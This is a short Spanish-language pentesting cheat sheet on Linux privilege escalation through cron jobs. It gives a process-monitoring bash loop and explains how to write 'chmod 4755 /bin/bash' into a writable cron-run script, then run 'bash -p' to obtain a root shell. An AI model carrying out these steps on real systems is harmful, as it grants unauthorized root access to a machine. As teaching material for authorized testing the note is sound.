# Explotación de tareas Cron

Mediante el siguiente script podemos ver las tareas de cron que se estan ejecutando.
```
#!/bin/bash

old_process=$(ps -eo command)
while true; do
        new_process=$(ps -eo command)
        diff >(echo "$old_process") >(echo "$new_process") | grep "[\>\<]" | grep -v "worker"
        old_process=$new_process
done
```
Una vez identificados los archivos que ejecuta, comprobamos si en alguno tenemos permisos de escritura.
Si el archivo que ejecuta la tarea cron tiene permisos de escritura podremos editar dicho archivo y escribir en el que se ejecute el comando:
```
chmod 4755 /bin/bash
```
Mediante el siguiente comando comprobaremos cuando se ha ejecutado.
```
watch -n 1 ls -l /bin/bash
```
Este comando nos muestra el resultado del comando "ls -l /bin/bash" cada segundo.
Una vez se ha ejecutado y el archivo tiene permiso suid ejecutamos el comando bash -p y se spawneará un bash como root.
